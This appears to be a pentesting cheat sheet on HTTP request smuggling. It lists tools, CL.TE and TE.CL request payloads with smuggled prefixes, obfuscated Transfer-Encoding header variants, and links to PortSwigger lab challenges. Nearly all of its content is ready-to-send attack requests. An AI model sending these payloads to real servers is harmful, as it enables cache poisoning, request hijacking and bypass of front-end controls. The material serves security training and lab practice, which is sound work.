# Request Smuggling

## Summary

* [Tools](#tools)
* [CL.TE vulnerabilities](#cl.te-vulnerabilities)
* [TE.CL vulnerabilities](#te.cl-vulnerabilities)
* [TE.TE behavior: obfuscating the TE header](#te.te-behavior-obfuscating-the-te-header)
* [References](#references)

## Tools

* [HTTP Request Smuggler / BApp Store](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646)
* [Smuggler](https://github.com/defparam/smuggler)

## CL.TE vulnerabilities

> The front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.

```powershell
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

Example:

```powershell
POST / HTTP/1.1
Host: domain.example.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

Challenge: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te

## TE.CL vulnerabilities

> The front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header. 

```powershell
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

Example:

```powershell
POST / HTTP/1.1
Host: domain.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86
Content-Length: 4
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1
0


```

:warning: To send this request using Burp Repeater, you will first need to go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.You need to include the trailing sequence \r\n\r\n following the final 0.

Challenge: https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl

## TE.TE behavior: obfuscating the TE header

> The front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.

```powershell
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

Challenge: https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header

## References

* [PortSwigger - Request Smuggling Tutorial](https://portswigger.net/web-security/request-smuggling) and [PortSwigger - Request Smuggling Reborn](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
* [A Pentester's Guide to HTTP Request Smuggling - Busra Demir - 2020, October 16](https://blog.cobalt.io/a-pentesters-guide-to-http-request-smuggling-8b7bf0db1f0)
